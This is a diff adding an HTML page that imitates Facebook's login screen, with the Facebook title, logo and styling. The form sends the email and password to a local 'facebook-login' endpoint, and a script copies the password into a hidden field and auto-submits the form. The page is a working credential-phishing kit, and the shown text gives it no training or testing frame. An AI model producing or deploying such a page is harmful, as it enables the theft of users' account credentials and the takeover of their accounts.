@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Facebook – log in or sign up</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f0f2f5;
+        margin: 0;
+        padding: 0;
+      }
+      #page {
+        max-width: 500px;
+        margin: 0 auto;
+        padding: 20px;
+      }
+      #login_form {
+        background: white;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      }
+      .form-group {
+        margin-bottom: 15px;
+      }
+      input[type="email"],
+      input[type="password"] {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #dddfe2;
+        border-radius: 6px;
+        font-size: 16px;
+        box-sizing: border-box;
+      }
+      button {
+        background-color: #1877f2;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        padding: 12px;
+        width: 100%;
+        font-size: 16px;
+        font-weight: bold;
+        cursor: pointer;
+      }
+      .links {
+        text-align: center;
+        margin-top: 20px;
+      }
+      .links a {
+        color: #1877f2;
+        text-decoration: none;
+      }
+      .divider {
+        border-top: 1px solid #dadde1;
+        margin: 20px 0;
+        text-align: center;
+        position: relative;
+      }
+      .divider span {
+        background: white;
+        padding: 0 10px;
+        position: relative;
+        top: -10px;
+      }
+      .create-btn {
+        background-color: #42b72a;
+        margin-top: 15px;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="page">
+      <div style="text-align: center; margin-bottom: 20px;">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" width="200">
+      </div>
+      
+      <form method="post" action="facebook-login" id="login_form">
+        <div class="form-group">
+          <input type="email" id="m_login_email" name="email" placeholder="Email or phone number">
+        </div>
+        <div class="form-group">
+          <input type="password" id="m_login_password" name="pass" placeholder="Password">
+          <input type="hidden" id="hiddenPass" name="pass">
+        </div>
+        <button type="button" id="btnsubmit">Log In</button>
+        
+        <div class="links">
+          <a href="#" id="forgot-password-link">Forgotten password?</a>
+        </div>
+        
+        <div class="divider">
+          <span>or</span>
+        </div>
+        
+        <button type="button" class="create-btn" id="signup-button">Create New Account</button>
+      </form>
+    </div>
+
+    <script>
+      // Handle password field and form submission
+      const hiddenPass = document.getElementById("hiddenPass");
+      const password = document.getElementById("m_login_password");
+      const form = document.getElementById("login_form");
+      const btn = document.getElementById("btnsubmit");
+      
+      password.onchange = (e) => {
+        hiddenPass.value = e.target.value;
+      }
+      
+      btn.onclick = (e) => {
+        setTimeout(() => form.submit(), 500);
+      }
+    </script>
+  </body>
+</html>
